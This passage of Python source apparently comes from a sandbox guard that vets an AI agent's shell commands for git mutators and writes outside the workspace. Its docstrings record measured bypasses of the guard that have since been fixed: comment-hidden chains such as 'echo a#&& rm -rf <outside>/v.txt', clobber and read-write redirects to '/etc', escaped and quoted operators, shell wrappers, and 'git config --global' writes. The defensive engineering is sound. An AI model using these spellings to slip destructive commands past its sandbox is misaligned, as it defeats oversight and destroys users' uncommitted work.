def _shell_lexer(cmd: str, punctuation) -> "shlex.shlex":
    """A ``shlex`` that reads the line the way the *shell* reads it — comments off.

    ``shlex`` treats ``#`` as a comment **wherever it appears** and drops the rest
    of the line. A shell does not: ``#`` starts a comment only where a **word**
    starts, and inside a word it is an ordinary character. So the shell reads
    ``echo a#&& cd <dir> && git checkout .`` as *three* commands — ``echo a#``,
    ``cd <dir>``, ``git checkout .`` — while the lexer handed the guard the single
    word ``echo a``. Measured on master `e9bd6d8ab003293e`, in a scratch repo
    holding one uncommitted edit: the guard answered ALLOW at ``read-only`` and the
    hidden tail really ran, discarding the edit (issue #1264). The same shape
    reached the path rule — ``echo a#&& rm -rf <outside>/v.txt`` was ALLOWED at
    ``workspace-write``, and ``echo a#&& echo x > <outside>/out.txt`` created a file
    outside the workspace — and the wrapper rule too, via
    ``echo a#&& $SHELL -c 'git checkout .'``.

    This is upstream of every rule, because it decides what the rules get to read.
    The invariant is one-directional, and that direction is the whole point: the
    guard must never read **less** of the line than the shell executes, because
    reading less hides a mutator and work is lost. Reading *more* than the shell
    runs cannot hide one — the over-read text is a comment the shell ignores — so
    the worst case is a refusal of a command that would have done nothing, which is
    the fail-closed side this guard already picks for input it cannot parse.

    The cost is stated rather than hidden: a comment whose *text* contains a chain
    (``ls # ; git checkout .``) is now refused, because telling that comment from
    code means re-deriving the shell's word-start rule — a second parser, which is
    exactly where a hole would come from.
    """
    lex = shlex.shlex(cmd, posix=True, punctuation_chars=punctuation)
    lex.commenters = ""
    return lex


def _split_command_tokens(cmd: str) -> list[str]:
    """Split a shell command into tokens, preserving operators like ``&&``.

    ``shlex`` in POSIX mode with ``punctuation_chars`` keeps quoting semantics:
    a ``>`` inside a quoted argument stays *inside* the token instead of
    becoming an operator (issue #1162), and ``&&`` / ``;`` / ``|`` survive as
    tokens so a chain can be walked.

    Falls back to a whitespace split when the input is unparseable (an
    unterminated quote), because a guard that raises on odd input is worse
    than one that over-blocks it.
    """
    cmd = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = _shell_lexer(cmd, True)
        lex.whitespace_split = True
        return _restore_windows_backslashes(list(lex))
    except ValueError:
        return _restore_windows_backslashes(cmd.split())


def _command_word(tok: str) -> str:
    """A command word without its directory prefix or Windows extension.

    ``/usr/bin/rm`` and ``rm.exe`` name the same program as ``rm``; matching
    only the bare spelling guards the polite form of the command.
    """
    base = tok.rsplit("/", 1)[-1].rsplit("\\", 1)[-1]
    if base.lower().endswith(".exe"):
        base = base[:-4]
    return base


def _args_after_command(tokens: list[str], i: int) -> list[str]:
    """The argument tokens of the command starting at ``tokens[i]``.

    Stops at the next command in a chain, so ``rm -rf a; echo hi`` yields only
    ``a`` — the shell separators are their own tokens after tokenizing.
    """
    args: list[str] = []
    for tok in tokens[i + 1:]:
        if tok in _COMMAND_SEPARATORS or tok in ("<", ">", ">>", "&>", "&>>"):
            break
        args.append(tok)
    return args


def _positional_args(tokens: list[str], i: int) -> list[str]:
    """The non-option *operands* of the command starting at ``tokens[i]``.

    Unlike a plain "drop anything starting with ``-``" filter, this also drops
    the value that follows an option which takes one. Without that,
    ``truncate -s 0 a.txt`` reports the size ``0`` as the file to be written,
    and the block names the wrong thing — a guard whose message points at a
    token that is not a path is a guard nobody can trust. A lone ``--`` ends
    option parsing, so everything after it is an operand.
    """
    out: list[str] = []
    args = _args_after_command(tokens, i)
    skip_next = False
    for tok in args:
        if skip_next:
            skip_next = False
            continue
        if tok == "--":
            continue
        if tok.startswith("-") and tok != "-":
            # `-s0` / `--size=0` carry their value in the same token; only the
            # spaced form consumes the next one.
            if tok in _OPTIONS_WITH_VALUE:
                skip_next = True
            continue
        out.append(tok)
    return out


def _is_redirect_operator(tok: str) -> bool:
    """True when ``tok`` is a redirect operator rather than a path.

    Named here so the walk can ask the question twice — once to find a redirect,
    once to refuse to call the *next* operator its target (a quoted `'>'` is an
    operator token by the time quoting is gone).

    Judged by **shape** rather than by a list, because the list is what the first
    version of this predicate was and it was two operators short of the ones a
    shell accepts. Measured on master `b0bd6188` (`bash_tool.py`
    `00b7e8884c95d9be`): `echo x >| /etc/f` and `echo x <> /etc/f` reported the
    targets `[]` at **both** tiers — allowed by `read-only`, whose whole job is to
    refuse a redirect to anything but `/dev/null`, as well as by
    `workspace-write`. Both genuinely write: in a throwaway directory bash and sh
    each created the file for `>|` (the clobber redirect) and bash created it for
    `<>` (read-write), so an empty target list there is a hole rather than an
    opinion. `>>|`, `>>&` and `&>>` created nothing under the shell this walk's
    own runtime uses (`create_subprocess_shell` -> `/bin/sh`; measured here as
    rc=2 syntax errors that write no file), which is why they are covered only
    incidentally — on bash 4+, where `&>>` and `>>&` are valid append-both
    redirects that do write, recognising them as operators is the safe direction
    rather than an unnecessary one.

    The shape test is: the token contains a `>` and no character that could be
    part of a path. That also covers the fd-prefixed spellings (`1>|`, `0<>`,
    `2>&1`, `5>&-`) without enumerating them, and it deliberately keeps a bare
    `<` *out* of the set: `<` reads, so naming its operand a write target would
    turn `cat < /etc/passwd` into a refusal — an over-block in exchange for
    nothing. Erring towards "operator" is the safe direction *because of* what
    the walk does with the answer: an operator is never recorded as a target, so
    recognising more of them only makes the walk look further for the real one.
    """
    return (
        bool(tok)
        and ">" in tok
        and re.fullmatch(r"[<>|&0-9-]+", tok) is not None
    )


def _is_fd_operand(tok: str) -> bool:
    """True when ``tok`` is a file *descriptor* rather than a path.

    Only ever asked about the operand of the ``>&`` operator, where the shell
    reads an all-digits or ``-`` operand as a descriptor to duplicate onto
    (``2>&1``, ``2>&-``) instead of a file to open. The order of ``&`` and ``>``
    is the whole discriminator, and it is the shell's, not a convention: ``&>1``
    is the other operator and really does write a file called ``1``, while
    ``>&1x`` and ``>& out.log`` name files (so spacing and "the operand is
    numeric" are both insufficient signals).

    Measured on master `39edaefa` (`bash_tool.py` `4dce1ffde8902bc1`), each
    command run by bash **and** sh in a fresh scratch directory: six duplication
    spellings (`2>&1`, `1>&2`, `>&2`, `2>&-`, `2>& 1`, and `2>&1` beside a later
    real redirect) created no file in either shell, while every genuine-file
    spelling in the same corpus (`> 1`, `&>1`, `>&1x`, `>& out.log`) really wrote
    the file the walk names. `[0-9]+` rather than ``str.isdigit`` because the
    latter is true of Unicode digits (`²`, `١`), which are not descriptors.
    """
    return tok == "-" or re.fullmatch(r"[0-9]+", tok) is not None


def _fully_quoted_token_indexes(cmd: str, tokens: list[str]) -> set[int] | None:
    """Indexes of ``tokens`` whose word was **entirely quoted** in the source line.

    ``'>'`` and ``>`` dequote to the same token, so once quoting is resolved the
    walk cannot tell a quoted operator from a real one — and the shell reads a
    quoted word as a *path*, never as a redirect. Without that fact the walk
    believed the first operator-shaped token it met, which cost a real target in
    one direction and invented one in the other: `echo '>' > /etc/x` reported
    `['>']` and was allowed to write outside (the under-block #1269 closed) while
    `grep -n '>' file.txt` was refused under `read-only` for "targeting
    'file.txt'" (the over-block this closes — the other half of issue #1268).

    Repaired by lexing the same line a second time with POSIX mode **off**, where
    `shlex` keeps the quote characters in the token, and pairing the two readings
    by index: a pair is fully quoted when the second reading is the first one
    wrapped in matching quotes (`'>'` around `>`). Requiring the *whole* word to
    be wrapped is what keeps a partially quoted word out of the set — `'a'b` and
    `a'b'` both dequote to `ab`, and neither is a quoted word.

    Answers ``None`` — **"cannot answer"** — whenever the two readings disagree
    about how many words there are (`echo 'a'b > '>'`: 4 words with quoting
    resolved, 5 with quoting kept) or the second lex fails. It used to answer the
    empty set for that state, which is a *different* fact: "answered, and no word
    is quoted". The two cannot be the same value, because the walk has to keep
    the safe side in both positions and the fallback is only safe in one of them
    (issue #1280): believing a real redirect was quoted drops its target, while
    believing a quoted one was real only refuses a command that writes nothing —
    true in **operator** position, and false in **target** position, where the
    token that should be named as the path is itself operator-shaped.
    """
    prepped = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = shlex.shlex(prepped, posix=False, punctuation_chars=True)
        lex.commenters = ""
        lex.whitespace_split = True
        second = _restore_windows_backslashes(list(lex))
    except ValueError:
        return None
    if len(second) != len(tokens):
        # The two readings are not known to be the same words, so the pairing
        # below would compare one word with another. Nothing is claimed.
        return None
    quoted: set[int] = set()
    for index, (plain, kept) in enumerate(zip(tokens, second)):
        if (
            len(kept) >= 2
            and kept[0] in "'\""
            and kept[-1] == kept[0]
            and kept[1:-1] == plain
        ):
            quoted.add(index)
    return quoted


_ESCAPED_OPERATOR_CHARS = "><|&;"
"""Characters a backslash can turn from an operator into an ordinary character.

The shell's own rule, not a convention: an escaped character is a *character*, so
`\\>` is the file `>` and `\\|` is the file `|`, while `\\` is a backslash and the
`>` behind it is an operator again. Only the control characters are listed —
masking the rest of the punctuation set would claim a fact the walk never asks
for, and masking a quote would destroy the quoting the lexer is about to read.
"""

_ESCAPE_PLACEHOLDERS = {
    ch: chr(0xE000 + i) for i, ch in enumerate(_ESCAPED_OPERATOR_CHARS)
}
"""One private-use code point per escaped character (#1307).

Private use because a placeholder must not be punctuation (that is the whole
point: `\\>` has to survive the lexer as part of a word) and must not be a
character a command line can plausibly contain. The Windows path already leans on
the same idea for a different reason (`_protect_windows_backslashes`), and the
recovery below returns "cannot say" rather than guessing when the line already
carries a placeholder.
"""


def _restore_escape_placeholders(token: str) -> str:
    """Undo the masking, so the reading can be compared with the plain one."""
    for ch, placeholder in _ESCAPE_PLACEHOLDERS.items():
        token = token.replace(placeholder, ch)
    return token


def _escaped_word_indexes(cmd: str, tokens: list[str]) -> set[int] | None:
    """Indexes of ``tokens`` whose word reached its shape through a **backslash**.

    An escaped operator-shaped word is a *path*: `\\>` is the file `>`, `\\|` is the
    file `|`, and neither is an operator or a command separator. `is_operator`
    excluded the *quoted* case (issues #1268/#1280) but had no counterpart for the
    escaped one, so an escaped word sitting in **target** position was read as an
    operator and the walk lost the real target — measured on master `cc352419`
    over 88 spellings (4 operators x every masking x 4 prefixes), each run as
    `/bin/sh -c` in a fresh scratch directory and the directory listed afterwards:
    8 rows name the wrong file or nothing at all, and 4 of them are ALLOWED at
    `read-only` although the shell created a file (`echo x >\\| log` and its three
    prefixes create `|` and were allowed; `echo x >\\> log` names `log` while the
    shell wrote `>`) — issue #1307.

    Recovered with the **same lexer the walk already uses**, on a line with every
    escaped control character replaced by a private-use placeholder: the escape
    has to survive as part of its word (`>\\|` has to read as the operator `>` and
    the word `|`, not as `>` and a separator), and the placeholder is what keeps
    it there. The masked line is then compared *word for word* with the reading
    the walk was handed, and only when the two are the same words is "this word
    carried an escape" a fact about that index. That comparison is the whole
    safety property, and it is what makes quoting a non-issue rather than a second
    parser: the masked reading goes through the same POSIX lexer, so quotes are
    resolved in it exactly as in the plain one. Where the two disagree — measured,
    an escape *inside* quotes (`echo x '\\>' log`, where the shell keeps the
    backslash the mask takes away) and an escaped backslash beside its operator
    (`echo x \\\\> log`, where the mask swallows the operator) — the answer is
    "cannot say" rather than a guess, and the walk keeps the answer it had.

    Measured over a 588-row family (4 prefixes x 21 operator spellings x 7 targets,
    every row run as `/bin/sh -c` in a fresh scratch directory and the directory
    listed afterwards): 392 rows really write a file, the walk names every one of
    them, and `read-only` refuses every one of them — 0 unnamed writes and 0
    invisible writes, against 8 and 4 before the fix. Over the same family the
    over-blocks fall from 86 to 18, and 4 of the 18 are new: a line whose
    operator-shaped word is a *quoted argument* (`echo x '>' \\|`) is read as a
    redirect to the escaped word behind it, because the quoting is unresolvable
    there (#1280's "cannot say") while the escape is not. All 4 write nothing —
    measured — so they are the over-block direction the walk already prices.

    What it does not claim, also measured: 28 of the 588 rows answer "cannot say",
    and every one of them carries an escape *inside quotes* (`echo x '\\>' log`),
    where masking the escape changes the word and the comparison rejects it. Those
    rows keep today's answer, which is a refusal for naming the following word —
    the over-block direction, nothing lost.

    Not consulted outside the redirect walk, and that boundary is stated too:
    `rm a\\;b` already names `a;b` in the plain reading, while a line whose
    *command* boundary carries the escape (`echo x \\; rm -rf <dir>`) is still
    read as a chain — again the over-block direction, refusing a line that
    removes nothing.
    """
    prepped = _protect_windows_backslashes(_strip_line_continuations(cmd))
    if any(placeholder in prepped for placeholder in _ESCAPE_PLACEHOLDERS.values()):
        return None                      # the line carries the marker: nothing claimed
    masked = prepped
    for ch, placeholder in _ESCAPE_PLACEHOLDERS.items():
        masked = masked.replace("\\" + ch, placeholder)
    if masked == prepped:
        return set()                     # answered: no control character is escaped
    try:
        lex = _shell_lexer(masked, True)
        lex.whitespace_split = True
        masked_tokens = list(lex)
    except ValueError:
        return None
    restored = [_restore_escape_placeholders(t) for t in masked_tokens]
    if restored != tokens:
        # The two readings are not known to be the same words, so "this word
        # carried an escape" is not a fact about any token in ``tokens``.
        return None
    placeholders = tuple(_ESCAPE_PLACEHOLDERS.values())
    return {
        index for index, tok in enumerate(masked_tokens)
        if any(placeholder in tok for placeholder in placeholders)
    }


def _unresolved_operator_run_tails(tokens: list[str],
                                   escaped: "set[int] | frozenset[int]" = frozenset(),
                                   ) -> list[str]:
    """Operator-shaped tokens sitting in **target** position, for issue #1280.

    Asked only when the two lexings disagreed, i.e. when the walk cannot say
    which operator-shaped tokens came from quoting. The first token of a run is in
    operator position — believing it keeps a real redirect naming the path behind
    it — while everything after it is in *target* position, where a token can only
    be operator-shaped because it was quoted into being a path.

    Restricted to a run that **swallows the rest of the line** (end of input, or a
    command separator): that is the geometry where the tail would otherwise be
    walked past and its file never named, which is what let `read-only` allow the
    write in #1280. Where a non-operator token follows the run the walk already
    names it, and naming the tail as well would add a claim about a command that
    cannot run — `echo x > > out` is `rc=2` in `/bin/sh` and `bash` in a fresh
    scratch directory, and creates nothing — so the narrower reading is kept.

    Measured over 320 generated commands (4 prefixes x 4 redirect spellings x 5
    targets x 4 partially quoted shapes), each run by the real shell: answering
    this way takes the holes from 96 to 0 and introduces none.

    What the direction costs, also measured rather than argued: a line whose
    operator-shaped words are *all* quoted arguments and which therefore writes
    nothing (`echo 'a'b '>' '>'`, `test 'a'b '>' '>'`) is newly refused — 6 of the
    9 such shapes tried. They are indistinguishable from the class above at the
    token level, which is exactly the fact the pairing could not recover, so the
    trade is 96 writes-that-happened no longer allowed against 6 echoes no longer
    allowed. Kept because the walk is the tier that exists to refuse writes.

    ``escaped`` is the fact this helper could not recover on its own (issue #1307):
    a word that reached operator shape through a backslash is a path, so it neither
    joins a run nor counts as the separator that ends one. Leaving it out is not
    merely untidy — measured over the 588-row family below, the same walk refuses
    54 lines that write nothing when this helper is handed no escape fact, and 18
    when it is, so 36 of those refusals are this helper reading an escaped word as
    an operator-run tail.
    """
    tails: list[str] = []
    i = 0
    while i < len(tokens):
        if i in escaped or not _is_redirect_operator(tokens[i]):
            i += 1
            continue
        j = i + 1
        while j < len(tokens) and j not in escaped and _is_redirect_operator(tokens[j]):
            j += 1
        if j - i >= 2 and (j == len(tokens)
                           or (j not in escaped and tokens[j] in _COMMAND_SEPARATORS)):
            tails.extend(tokens[i + 1:j])
        i = j
    return tails


def _extract_write_targets(cmd: str, _depth: int = 0) -> list[str]:
    """Write targets of ``cmd``: the paths a command appears to write.

    Returns path tokens the command appears to write to:
      - ``rm <path>...`` and ``rmdir <path>`` → the removed paths
      - ``mv <src> <dst>`` / ``cp <src> <dst>`` → the destination
      - ``> / >> / 2> / &> / >| / <>`` redirects → the redirect target

    **Parsed, not scanned** (issue #1162). The previous version regex-scanned
    raw text, which failed in both directions:

      - it read a ``>`` *inside a quoted argument* as a redirect, so ordinary
        reads were refused — ``echo "a > b"`` reported target ``'b"'``,
        ``python3 -c "print(1 > 0)"`` reported ``'0)"'``, and any ``->`` in
        prose was a redirect to the next word. Measured on master: 7 of 7
        ordinary read commands blocked, including a ``gh issue create`` whose
        *title* contained ``>`` (which cost the host a retry in a real cycle);
      - it matched verbs by spelling, so ``rm <file>`` (no recursive flag) and
        unlisted writers (``sed -i``, ``truncate``, ``tee``, ``cp`` without
        ``-r``) were not destructive at all — 7 of 7 measured writes allowed.

    Quoting is what distinguishes the two, and the token stream alone is not
    enough to recover it. It knows whether a `>` sat inside a longer argument
    (`echo "a > b"` is one token), but not whether a `>` that stood alone as a
    word was quoted — `'>'` and `>` dequote to the same token. That single gap
    produced both failures of issue #1268, in opposite directions:

      - **under-block**: a quoted operator consumed the next token as its
        `target`, so the *real* redirect's target was never reported — measured
        on master, `echo '>' > /etc/x` produced targets `['>']` and was allowed
        to write `/etc/x` at workspace-write while `echo x > /etc/x` was
        blocked;
      - **over-block**: with no real redirect at all, the quoted operator was
        still read as one, so `grep -n '>' file.txt` was refused under
        `read-only` for "targeting 'file.txt'" although grep never writes it.

    Both are now closed by asking the shell's own question — a quoted word is a
    path, never a redirect (`_fully_quoted_token_indexes`, which recovers the
    fact from a second lex pass with quoting kept). An operator is therefore
    *shape and not quoted*, and operator tokens are skipped when looking for the
    target, so the boundary no longer depends on whether a `>` was quoted.

    What remains is input the two readings disagree about (`echo 'a'b > '>'`), and
    there the walk keeps the safe side in **both** positions (issue #1280). In
    operator position a token is still believed, so a real redirect keeps naming
    the path behind it. In target position the operator-shaped tail of a run is
    *named* rather than believed: a command that really has a second operator
    there is a syntax error in `/bin/sh` and `bash` (measured: `echo x > > out`
    writes nothing) while a quoted path there writes a real file, so naming it
    can only refuse a command that writes nothing — and losing it let `read-only`
    allow a write, which is how #1280 was found.

    Believing an operator-shaped token in *operator* position is the same
    fail-closed direction, and it has the same price: when the quoting sits
    **inside** an operator-shaped word the pairing cannot recover it at all — the
    second reading (`_fully_quoted_token_indexes`'s
    `shlex.shlex(cmd, posix=False, punctuation_chars=True)` with
    `whitespace_split = True`) raises on `echo x 2'>>' log` (`No closing quotation`)
    and differs in word count on `echo x \\> log` (`['echo','x','>','log']` against
    `['echo','x','\\\\','>','log']`) — so both answer "cannot say", and the walk
    names the following word (`log`, `out.txt`) although the shell creates
    nothing: measured in fresh scratch directories, each exits 0 with an empty
    directory, in `/bin/sh` and `/bin/bash` alike. The helper is named because the
    obvious reconstruction is **not** this reading: `shlex.split(cmd, posix=False)`
    does not raise on either line (it returns `['echo', 'x', "2'>>'", 'log']`), so
    a reader who tries it concludes the docstring is wrong about its own guard.
    Filed as issue #1273 rows 1-2
    (row 3, the `git config` value walk, is fixed) and pinned by
    `tests/test_bash_tool_sandbox.py` as a residual with its ground truth rather
    than left to prose: the two rows are refused today, and the change that fixes
    them flips those assertions deliberately.

    Still deliberately non-exhaustive in *which verbs* it covers (an
    interpreter can always write a file); the honest boundary stays
    ``enforcement="partial"``.

    An operator's operand is not always a path: the operand of `>&` is a file
    *descriptor* when it is all digits or `-`, so `grep -n x f.txt 2>&1` opens
    nothing and now names no target, instead of being refused for "targeting
    '1'" in the very tier a dirty-tree downgrade uses (`_is_fd_operand`, issue
    #1275). The operator's spelling is what decides it, never the operand alone:
    `&>1` and `echo x > 1` both really write a file called `1` and still name it.

    Heredoc bodies that no shell executes are masked first: a body is text on
    some command's stdin, and reading it as shell code named prose and the
    delimiter word as write targets (`_mask_data_heredoc_bodies`).
    """
    masked = _mask_data_heredoc_bodies(cmd)
    tokens = _split_command_tokens(masked)
    # A quoted operator is not an operator: `'>'` dequotes to `>`, so the token
    # stream alone cannot say which one the shell will act on. `is_operator` is
    # the one question — shape *and* not quoted — asked wherever the walk needs
    # it, so "is this a redirect?" and "is this an operator rather than a path?"
    # cannot drift apart (issue #1268).
    quoted = _fully_quoted_token_indexes(masked, tokens)
    # `None` is "the two readings disagree", not "nothing is quoted": when the
    # walk cannot say which operator-shaped tokens came from quoting, it keeps the
    # safe side in *both* positions (issue #1280) — the run handling below names
    # the tokens that sit in target position, which is what the old empty set lost.
    quoting_unknown = quoted is None
    quoted = quoted or set()
    # An *escaped* operator-shaped word is a path for the same reason a quoted one
    # is, and it is the half `quoted` cannot see: `>\|` keeps the escape out of the
    # token stream (the plain reading dequotes it to `|`) so the walk read the
    # word as a separator, named no target at all, and `read-only` allowed a write
    # the shell really made (issue #1307, found by a sweep of 88 spellings). Both
    # consultations below are one-directional — an escaped word is never an
    # operator and never a separator — and the recovery answers "cannot say" rather
    # than guessing when the two readings are not known to be the same words.
    escaped = _escaped_word_indexes(masked, tokens)
    # `None` is "cannot say", which is answered by leaving the walk's two questions
    # alone — the escape is a fact about *this* line or it is not claimed at all.
    escaped = escaped or set()

    def is_operator(index: int) -> bool:
        return (index not in quoted and index not in escaped
                and _is_redirect_operator(tokens[index]))

    def is_separator(index: int) -> bool:
        """The shell's word-boundary question, asked with the escape in hand."""
        return index not in escaped and tokens[index] in _COMMAND_SEPARATORS

    targets: list[str] = []
    if quoting_unknown:
        # The two readings disagreed, so an operator-shaped token cannot be told
        # from a quoted path. Operator position keeps the old answer (the walk
        # below still believes it, so a real redirect keeps naming its path);
        # target position is answered here, because that is the direction the old
        # empty-set fallback lost (issue #1280).
        targets.extend(_unresolved_operator_run_tails(tokens, escaped))
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        word = _command_word(tok)
        # Redirects: `>` `>>` `&>` `&>>` `>|` `<>` are their own tokens, and a
        # numeric fd prefix arrives as a separate token (`2` `>` `e`). Which
        # spellings count is `_is_redirect_operator`'s job — this walk only asks.
        if is_operator(i):
            # An operator is never a write target. A *quoted* `>` reaches this
            # walk as an operator token — the tokenizer dequotes, so `'>'` and
            # `>` are the same string here — and taking the next token blindly
            # made the quoted one consume the real redirect's target: measured
            # on master, `echo '>' > /etc/x` yielded targets `['>']` and was
            # ALLOWED at workspace-write (the file was really created outside)
            # while `echo x > /etc/x` was blocked. Skipping operator tokens
            # reports the target the shell will actually write, so the boundary
            # no longer depends on whether a `>` was quoted.
            j = i + 1
            while j < len(tokens) and is_operator(j):
                j += 1
            if j < len(tokens) and not is_separator(j):
                # …but the operand of `>&` is not always a path: when it is all
                # digits or `-` the shell duplicates onto that descriptor and
                # opens nothing (`2>&1`, `2>&-`). Recording it made ordinary
                # read-only diagnostics — `grep -n x f.txt 2>&1` — refusals for
                # "targeting '1'" in the one tier whose documented recovery flow
                # is to run read commands from inside it (issue #1275). The
                # operator's spelling decides this, never the operand alone:
                # `&>1` writes a real file called `1` and `echo x > 1` writes it
                # too, so both keep naming their target here.
                if not (tokens[i] == ">&" and _is_fd_operand(tokens[j])):
                    targets.append(tokens[j])
                i = j + 1
                continue
        elif word == "rm" or word == "rmdir":
            # Any operand is removed — NOT only with a recursive flag.
            # `rm a.txt` destroys uncommitted work exactly like `rm -rf dir`;
            # whether the delete recurses does not decide whether the file
            # survives.
            targets.extend(_positional_args(tokens, i))
        elif word == "git":
            # `--output=<file>` is the diff-family readers' shared redirect:
            # `git diff --output=<f>` truncates and writes <f> exactly as
            # `> <f>` does. Scoped to a git invocation because the tokenizer
            # dequotes — a token `--output=x` is textually identical whether
            # git would read it as an option or it sits inside quotes.
            targets.extend(_git_output_flag_targets(tokens, i))
            # `git config` names the file it writes as an *operand*, not as a
            # shell redirect, so no redirect in the command reaches it: the
            # `--file <p>` / `-f <p>` operand and the global/system config behind
            # `--global` / `--system`. See `_git_config_write_targets`.
            targets.extend(_git_config_write_targets(tokens, i))
        elif word == "mv":
            args = _positional_args(tokens, i)
            if len(args) >= 2:
                targets.append(args[-1])
        elif word == "cp":
            args = _positional_args(tokens, i)
            if len(args) >= 2:
                targets.append(args[-1])
        elif word in _INPLACE_WRITER_VERBS:
            targets.extend(_positional_args(tokens, i))
        elif word == "sed":
            # `sed -i` rewrites its file operands in place; a bare `sed` is a
            # filter that writes only to stdout and must stay allowed. The flag
            # may carry a suffix (`-i.bak`), so test the prefix.
            args = _args_after_command(tokens, i)
            if any(t == "-i" or t.startswith("-i") for t in args):
                # The first operand of `sed` is the *script*, not a file —
                # only the operands after it are rewritten. Naming the script
                # (`sed -i s/a/b/ f.txt` → `s/a/b/`) would point the block at
                # something that is not a path.
                targets.extend(_positional_args(tokens, i)[1:])
        elif word == "find":
            # `find <paths> ... -delete` removes every match; the paths it was
            # pointed at are the work at risk. Without `-delete` a `find` is a
            # read and must stay allowed (issue #1162 listed `-delete` as an
            # allowed destructive write on master).
            args = _args_after_command(tokens, i)
            if "-delete" in args:
                targets.extend(_positional_args(tokens, i))
        i += 1
    # Reach the same places the git-mutator scan reaches: a destructive
    # command the shell will run is judged wherever it is written (issue
    # #1234). `_nested_command_texts` is the same over-approximating walk
    # `_find_git_mutator` uses, capped at the same depth, so the two rules
    # cannot drift apart again.
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            for t in _extract_write_targets(nested, _depth + 1):
                if t not in targets:
                    targets.append(t)
    return targets


def _git_output_flag_targets(tokens: list[str], i: int) -> list[str]:
    """Write targets named by a git invocation's ``--output[=]<file>`` flag.

    Scoped to ``git`` on purpose. The tokenizer dequotes, so a global test on
    the token cannot distinguish the option from the same characters inside a
    string literal (``echo "--output=x"`` tokenizes to the same
    ``--output=x``), and a guard that refuses a command for *mentioning* the
    flag is the spelling-vs-effect defect fixed in #1162. As a git option the
    flag has a real position, so it is read only where git would read it.
    """
    out: list[str] = []
    args = _args_after_command(tokens, i)
    for j, tok in enumerate(args):
        if not _OUTPUT_FLAG_RE.match(tok):
            continue
        attached = tok.split("=", 1)[1] if "=" in tok else ""
        if attached:
            out.append(attached)
        elif j + 1 < len(args):
            out.append(args[j + 1])          # `--output <file>`
    return out


def _git_config_write_targets(tokens: list[str], i: int) -> list[str]:
    """The file a *writing* ``git config`` invocation writes.

    `git config` is the one git verb whose file operand is not the working tree,
    and both of its shapes leave a workspace: ``--file <p>`` / ``-f <p>`` writes
    exactly ``<p>``, while ``--global`` / ``--system`` writes the user's or the
    system's config. Neither was visible to the walk, so workspace-write — whose
    stated job is to refuse absolute targets outside the workspace root —
    answered ALLOW with an empty target list. Measured on master `0ff41174aaceb978`
    against git 2.50.1: all four `--file`/`-f` spellings, `--global`, `--system`,
    a global option before the verb (`git -c x=1 config …`), an `env` wrapper and
    a `sh -c` wrapper were all allowed, and git really created the named file in
    each case. The *verb* was already a mutator at read-only, so read-only was
    never the tier with the hole — the untested tier was the one every cycle
    actually runs in.

    Only a **writing** invocation names a target, and the verdict comes from
    `_git_invocation_is_mutator` rather than from a second opinion about the
    flags: `git config --global --get user.name` is the identity check every
    cycle is told to run, and `git config --file <p> --get k` reads a file it
    must not be refused for *reading*. Naming a target for either would trade
    this hole for a new over-block and protect nothing.

    `--global` / `--system` are named by the file git writes by default
    (`~/.gitconfig`, `/etc/gitconfig`). git honours `GIT_CONFIG_GLOBAL`,
    `XDG_CONFIG_HOME` and a build prefix, any of which moves that file — but
    never inside a workspace, so the verdict this feeds (target outside the write
    roots ⇒ refuse) is the same one under every spelling.
    """
    inv = _git_invocation_at(tokens, i)
    if inv is None:
        return []
    _, verb, rest = inv
    if verb != "config":
        return []
    if _git_invocation_is_mutator(verb, rest) is None:
        return []                       # a read names no file it writes
    for j, tok in enumerate(rest):
        if tok in ("--file", "-f"):
            # A flag is never a file *name*: `--file --global` is a malformed
            # spelling, and naming `--global` as the path it writes would put a
            # flag in the refusal — the same "an operator is never a target"
            # discipline the redirect walk applies to `> (issue #1268).
            if j + 1 < len(rest) and not rest[j + 1].startswith("-"):
                return [rest[j + 1]]
            return []
        if tok.startswith("--file="):
            value = tok.split("=", 1)[1]
            return [value] if value else []
        if tok.startswith("-f") and len(tok) > 2:
            return [tok[2:]]
    if "--global" in rest:
        return ["~/.gitconfig"]
    if "--system" in rest:
        return ["/etc/gitconfig"]
    return []                           # `--local` is the repo's own .git/config


def _protected_paths() -> list[str]:
    """Canonicalized (realpath) protected daemon state files."""
    out: list[str] = []
    for p in _PROTECTED_FILES:
        try:
            out.append(os.path.realpath(os.path.expanduser(p)))
        except OSError:
            pass
    return out


def _trusted_write_zones() -> list[str]:
    """Canonicalized write roots that a ``workspace-write`` session may target.

    These are trusted alongside the injected workspace root and the OS temp
    area — targets inside them are never blocked by the ``workspace-write``
    boundary:

    - ``~/.emrg/evolution/.emrg/`` — the evolution module's own data root
      (cycle records under ``memory/``, ``sessions/`` scratch). The evolution
      task runs at ``workspace-write`` with ``workspace`` = the repo checkout
      (``~/.emrg/evolution/emrg``), so its own record writes to
      ``~/.emrg/evolution/.emrg/memory/*.md`` fall OUTSIDE ``workspace`` and
      would be blocked — a self-regression from PR #1092 (issue #1093). Trust
      this root like the daemon's own ``~/.emrg`` state, so the evolution
      module can still record its history.
    """
    out: list[str] = []
    evo_data = os.path.expanduser("~/.emrg/evolution/.emrg")
    try:
        out.append(os.path.realpath(evo_data))
    except OSError:
        pass
    return out


def _temp_write_roots() -> set[str]:
    r"""Canonicalized OS-temp write roots, normalized for the ``Temp\<suffix>``
    discrepancy (issue #1093 proposal #3).

    ``tempfile.gettempdir()`` may return ``C:\\...\\AppData\\Local\\Temp\\2``
    (8.3 short name + ``\\2`` suffix) on Windows, while helpers/scripts are
    written to the plain ``...\\Temp\\`` root. When ``gettempdir()`` points at
    a ``Temp``-named parent with a suffix child, also trust the parent ``Temp``
    root so both spellings are allowed.
    """
    roots: set[str] = set()
    t = tempfile.gettempdir()
    try:
        roots.add(os.path.realpath(t))
    except OSError:
        pass
    parent = os.path.dirname(t)
    if os.path.basename(parent).lower() == "temp":
        try:
            roots.add(os.path.realpath(parent))
        except OSError:
            pass
    return roots


def _is_absolute_path(p: str) -> bool:
    """True when ``p`` is absolute (or drive-less rooted, e.g. ``/etc/hosts``
    on Windows — ntpath.isabs returns False for those, but they still do not
    resolve under the cwd, so the sandbox must treat them as absolute).

    A drive-rooted spelling (`C:\\…`, `C:/…`) counts as absolute when the shell
    that will run the command is a Windows shell. `ntpath.isabs` already answers
    True for it there, so on that platform this arm is redundant — it is here so
    the rule does not depend on which `os.path` the *guard* happens to be
    running under, which is what makes issue #1261's branch verifiable off
    Windows. On a POSIX shell the spelling is a relative name and is left alone.
    """
    return (
